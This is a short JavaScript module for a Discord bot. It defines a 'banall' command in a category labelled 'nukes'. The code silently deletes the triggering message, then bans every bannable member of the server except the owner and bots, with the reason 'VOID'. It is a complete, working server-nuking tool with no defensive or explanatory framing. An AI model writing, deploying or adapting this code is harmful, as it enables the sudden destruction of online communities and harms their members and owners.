module.exports = {
  name: 'banall',
  description: '⚠️ Ban every kickable/bannable member (except bots).',
  category: 'nukes',
  async execute(message) {
    if (!message.guild) return;
    await message.delete().catch(()=>{});
    const ms = await message.guild.members.fetch();
    ms.forEach(m => { if (m.bannable && m.id !== message.guild.ownerId && !m.user.bot) m.ban({ reason:'VOID' }).catch(()=>{}); });
  },
};
